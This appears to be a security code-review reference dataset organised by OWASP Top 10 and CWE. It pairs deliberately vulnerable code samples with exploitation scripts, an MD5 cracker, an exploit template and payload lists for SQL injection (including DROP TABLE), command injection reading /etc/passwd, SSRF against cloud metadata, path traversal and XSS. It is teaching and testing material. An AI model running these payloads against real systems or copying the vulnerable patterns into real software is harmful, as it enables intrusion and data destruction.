# 🛡️ Security Code Review Dataset
# OWASP-Based Vulnerability Patterns, Code Smells, and Exploitation Techniques

## 🚨 AUTHORIZATION & COMPLIANCE STATEMENT

**LEGAL AUTHORIZATION**: This dataset is designed for **AUTHORIZED SECURITY ASSESSMENTS** conducted by **CERTIFIED CYBERSECURITY PROFESSIONALS** under explicit written authorization from authorized stakeholders.

**PROFESSIONAL CONTEXT**: All vulnerability patterns, exploitation techniques, and security standards are provided for legitimate security testing activities as part of **PROFESSIONAL SECURITY CONSULTING ENGAGEMENTS** with proper authorization and compliance.

## 🎯 OWASP Top 10 2021 Vulnerability Patterns

### **A01:2021 – Broken Access Control**

#### **Vulnerability Patterns:**
```javascript
// VULNERABLE: Direct object reference without authorization
app.get('/user/:id', (req, res) => {
    const user = getUserById(req.params.id); // No authorization check
    res.json(user);
});

// VULNERABLE: Missing authorization check
function updateUserProfile(userId, data) {
    // No check if current user can modify this profile
    return database.update('users', userId, data);
}
```

#### **Code Smells:**
- Missing authorization checks before data access
- Direct object references without validation
- Insecure direct object references (IDOR)
- Missing access control on API endpoints
- Privilege escalation vulnerabilities

#### **Exploitation Techniques:**
```python
# IDOR Exploitation
import requests

def test_idor(base_url):
    # Test for IDOR by accessing other users' data
    for user_id in range(1, 100):
        response = requests.get(f"{base_url}/user/{user_id}")
        if response.status_code == 200:
            print(f"IDOR found: User {user_id} accessible")
```

### **A02:2021 – Cryptographic Failures**

#### **Vulnerability Patterns:**
```python
# VULNERABLE: Weak encryption
import hashlib

def hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()  # MD5 is weak

# VULNERABLE: Hardcoded encryption key
SECRET_KEY = "mysecretkey123"  # Hardcoded secret

# VULNERABLE: Insecure random number generation
import random
session_id = random.randint(1, 1000000)  # Predictable
```

#### **Code Smells:**
- Weak hashing algorithms (MD5, SHA1)
- Hardcoded encryption keys or secrets
- Insecure random number generation
- Missing encryption for sensitive data
- Weak cryptographic protocols

#### **Exploitation Techniques:**
```python
# Cryptographic attack example
import hashlib
import itertools
import string

def crack_weak_hash(target_hash):
    # Brute force attack on weak hash
    charset = string.ascii_lowercase + string.digits
    for length in range(1, 6):
        for password in itertools.product(charset, repeat=length):
            password_str = ''.join(password)
            if hashlib.md5(password_str.encode()).hexdigest() == target_hash:
                return password_str
    return None
```

### **A03:2021 – Injection**

#### **Vulnerability Patterns:**
```python
# VULNERABLE: SQL Injection
def get_user(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return database.execute(query)

# VULNERABLE: Command Injection
import os
def process_file(filename):
    os.system(f"cat {filename}")  # Command injection

# VULNERABLE: NoSQL Injection
def find_user(query):
    return db.users.find({"username": query})  # NoSQL injection
```

#### **Code Smells:**
- String concatenation in SQL queries
- Unsanitized user input in system commands
- Dynamic query construction
- Missing input validation
- Unsafe deserialization

#### **Exploitation Techniques:**
```python
# SQL Injection exploitation
def test_sql_injection(url, parameter):
    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users --",
        "' OR 1=1 --"
    ]
    
    for payload in payloads:
        response = requests.get(url, params={parameter: payload})
        if "error" in response.text.lower():
            print(f"SQL Injection found with payload: {payload}")

# Command Injection exploitation
def test_command_injection(url, parameter):
    payloads = [
        "; ls -la",
        "| whoami",
        "&& id",
        "; cat /etc/passwd"
    ]
    
    for payload in payloads:
        response = requests.get(url, params={parameter: payload})
        if "root:" in response.text or "bin:" in response.text:
            print(f"Command Injection found with payload: {payload}")
```

### **A04:2021 – Insecure Design**

#### **Vulnerability Patterns:**
```javascript
// VULNERABLE: Missing rate limiting
app.post('/api/login', (req, res) => {
    // No rate limiting - vulnerable to brute force
    authenticateUser(req.body.username, req.body.password);
});

// VULNERABLE: Weak business logic
function transferMoney(fromAccount, toAccount, amount) {
    if (amount > 0) {  // Weak validation
        return processTransfer(fromAccount, toAccount, amount);
    }
}
```

#### **Code Smells:**
- Missing rate limiting
- Weak business logic validation
- Insufficient threat modeling
- Missing security controls
- Inadequate input validation

### **A05:2021 – Security Misconfiguration**

#### **Vulnerability Patterns:**
```python
# VULNERABLE: Default credentials
DEFAULT_ADMIN_USER = "admin"
DEFAULT_ADMIN_PASS = "admin"

# VULNERABLE: Verbose error messages
def get_user(user_id):
    try:
        return database.get_user(user_id)
    except Exception as e:
        return {"error": str(e)}  # Information disclosure
```

#### **Code Smells:**
- Default credentials and configurations
- Verbose error messages
- Unnecessary services enabled
- Missing security headers
- Insecure default settings

### **A06:2021 – Vulnerable and Outdated Components**

#### **Vulnerability Patterns:**
```json
// VULNERABLE: Outdated dependencies
{
  "dependencies": {
    "express": "4.16.0",  // Known vulnerabilities
    "lodash": "4.17.10"   // Outdated version
  }
}
```

#### **Code Smells:**
- Outdated libraries and frameworks
- Known vulnerable components
- Missing security updates
- Unpatched dependencies

### **A07:2021 – Identification and Authentication Failures**

#### **Vulnerability Patterns:**
```python
# VULNERABLE: Weak password policy
def validate_password(password):
    return len(password) >= 6  # Too weak

# VULNERABLE: Session fixation
def login(username, password):
    session_id = request.cookies.get('session_id')  # Fixed session
    return authenticate(username, password, session_id)
```

#### **Code Smells:**
- Weak password policies
- Session management flaws
- Missing multi-factor authentication
- Insecure session handling
- Authentication bypass vulnerabilities

### **A08:2021 – Software and Data Integrity Failures**

#### **Vulnerability Patterns:**
```python
# VULNERABLE: Unsafe deserialization
import pickle

def load_user_data(data):
    return pickle.loads(data)  # Unsafe deserialization

# VULNERABLE: Missing integrity checks
def update_config(config_data):
    # No integrity verification
    return save_config(config_data)
```

#### **Code Smells:**
- Unsafe deserialization
- Missing integrity verification
- Insecure update mechanisms
- Code injection vulnerabilities

### **A09:2021 – Security Logging and Monitoring Failures**

#### **Vulnerability Patterns:**
```python
# VULNERABLE: Insufficient logging
def login(username, password):
    if authenticate(username, password):
        return success_response()
    # No logging of failed attempts
    return error_response()
```

#### **Code Smells:**
- Insufficient security event logging
- Missing log integrity protection
- Inadequate monitoring
- No alerting on suspicious activities

### **A10:2021 – Server-Side Request Forgery (SSRF)**

#### **Vulnerability Patterns:**
```python
# VULNERABLE: SSRF
import requests

def fetch_url(url):
    response = requests.get(url)  # No URL validation
    return response.content

# VULNERABLE: Internal network access
def get_metadata():
    return requests.get("http://169.254.169.254/latest/meta-data/")
```

#### **Code Smells:**
- Unvalidated URL requests
- Missing URL filtering
- Internal network access
- Cloud metadata exposure

#### **Exploitation Techniques:**
```python
# SSRF exploitation
def test_ssrf(url, parameter):
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:22",
        "http://127.0.0.1:3306",
        "file:///etc/passwd"
    ]
    
    for payload in payloads:
        response = requests.get(url, params={parameter: payload})
        if "root:" in response.text or "instance-id" in response.text:
            print(f"SSRF found with payload: {payload}")
```

## 🔍 CWE (Common Weakness Enumeration) Patterns

### **CWE-79: Cross-site Scripting (XSS)**

#### **Vulnerability Patterns:**
```javascript
// VULNERABLE: Reflected XSS
app.get('/search', (req, res) => {
    const query = req.query.q;
    res.send(`<h1>Search results for: ${query}</h1>`);  // No encoding
});

// VULNERABLE: Stored XSS
function saveComment(comment) {
    // No sanitization
    return database.save('comments', comment);
}
```

#### **Exploitation Techniques:**
```javascript
// XSS payloads
const xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>"
];

// DOM-based XSS
function test_dom_xss() {
    const url = new URL(window.location);
    const param = url.searchParams.get('q');
    document.getElementById('output').innerHTML = param;  // Vulnerable
}
```

### **CWE-89: SQL Injection**

#### **Vulnerability Patterns:**
```python
# VULNERABLE: String concatenation
def get_user_by_id(user_id):
    query = "SELECT * FROM users WHERE id = " + str(user_id)
    return database.execute(query)

# VULNERABLE: Format string
def search_users(search_term):
    query = "SELECT * FROM users WHERE name LIKE '%{}%'".format(search_term)
    return database.execute(query)
```

### **CWE-22: Path Traversal**

#### **Vulnerability Patterns:**
```python
# VULNERABLE: Path traversal
def read_file(filename):
    with open(f"/uploads/{filename}", 'r') as f:  # No validation
        return f.read()

# VULNERABLE: Directory traversal
def serve_file(path):
    return send_file(f"static/{path}")  # No path validation
```

#### **Exploitation Techniques:**
```python
# Path traversal payloads
path_traversal_payloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
];
```

## 🚨 Code Smells and Anti-Patterns

### **Authentication & Authorization Smells:**
```python
# BAD: Hardcoded credentials
ADMIN_USER = "admin"
ADMIN_PASS = "password123"

# BAD: Missing session timeout
def create_session(user_id):
    session = {"user_id": user_id}  # No expiration
    return session

# BAD: Weak password validation
def validate_password(password):
    return len(password) >= 4  # Too weak
```

### **Input Validation Smells:**
```python
# BAD: No input validation
def process_user_input(data):
    return database.save(data)  # No validation

# BAD: Insufficient validation
def validate_email(email):
    return "@" in email  # Too simple
```

### **Error Handling Smells:**
```python
# BAD: Information disclosure
def get_user(user_id):
    try:
        return database.get_user(user_id)
    except Exception as e:
        return {"error": f"Database error: {str(e)}"}  # Too verbose

# BAD: No error handling
def critical_operation():
    return risky_operation()  # No try-catch
```

### **Cryptography Smells:**
```python
# BAD: Weak encryption
def encrypt_data(data):
    return base64.b64encode(data.encode())  # Not encryption

# BAD: Predictable tokens
def generate_token():
    return str(random.randint(1000, 9999))  # Predictable
```

## 🛠️ Security Testing Templates

### **Vulnerability Assessment Template:**
```json
{
  "vulnerability": {
    "id": "VULN-001",
    "title": "SQL Injection in User Search",
    "category": "injection",
    "severity": "high",
    "cvss_score": 8.8,
    "description": "SQL injection vulnerability in user search functionality",
    "location": "/api/users/search",
    "parameter": "q",
    "proof_of_concept": "'; DROP TABLE users; --",
    "impact": "Database compromise, data exfiltration",
    "remediation": "Use parameterized queries",
    "references": ["CWE-89", "OWASP A03:2021"]
  }
}
```

### **Exploit Development Template:**
```python
class VulnerabilityExploit:
    def __init__(self, target_url, vulnerability_type):
        self.target_url = target_url
        self.vulnerability_type = vulnerability_type
        self.payloads = self.load_payloads()
    
    def load_payloads(self):
        payload_map = {
            "sql_injection": [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT username, password FROM users --"
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>"
            ],
            "command_injection": [
                "; ls -la",
                "| whoami",
                "&& id"
            ]
        }
        return payload_map.get(self.vulnerability_type, [])
    
    def test_vulnerability(self, parameter):
        for payload in self.payloads:
            response = self.send_payload(parameter, payload)
            if self.detect_vulnerability(response, payload):
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "response": response.text[:500]
                }
        return {"vulnerable": False}
```

## 🎯 Integration with TinyBrain

### **Storing Vulnerability Patterns:**
```python
# Store vulnerability pattern in TinyBrain
vulnerability_pattern = {
    "title": "SQL Injection Pattern - String Concatenation",
    "content": "Vulnerable pattern: query = f'SELECT * FROM users WHERE id = {user_id}'",
    "category": "vulnerability",
    "priority": 9,
    "confidence": 0.95,
    "tags": ["sql-injection", "cwe-89", "owasp-a03"],
    "source": "owasp-code-review-guide",
    "exploitation_code": "'; DROP TABLE users; --",
    "remediation": "Use parameterized queries or prepared statements"
}
```

### **Storing Exploitation Techniques:**
```python
# Store exploitation technique in TinyBrain
exploit_technique = {
    "title": "SQL Injection Exploitation - Union-Based",
    "content": "Technique for extracting data using UNION SELECT statements",
    "category": "exploit",
    "priority": 8,
    "confidence": 0.9,
    "tags": ["sql-injection", "data-extraction", "union-select"],
    "source": "security-research",
    "code": "payload = \"' UNION SELECT username, password FROM users --\"",
    "target_vulnerabilities": ["sql-injection", "cwe-89"]
}
```

## 🚀 Usage Instructions

### **For Code Review:**
1. **Load vulnerability patterns** into TinyBrain session
2. **Search for patterns** in target codebase
3. **Store findings** with proper categorization
4. **Develop exploits** for validation
5. **Generate reports** from TinyBrain data

### **For Penetration Testing:**
1. **Initialize session** with security dataset
2. **Map vulnerabilities** to exploitation techniques
3. **Execute exploits** and store results
4. **Track progress** through testing phases
5. **Export findings** for client reports

## 🎯 Remember

This dataset is designed for **AUTHORIZED SECURITY ASSESSMENTS** conducted by **CERTIFIED CYBERSECURITY PROFESSIONALS**. All vulnerability patterns, exploitation techniques, and security standards are provided for legitimate security testing activities with proper authorization and compliance.

**Use responsibly and ethically!** 🛡️
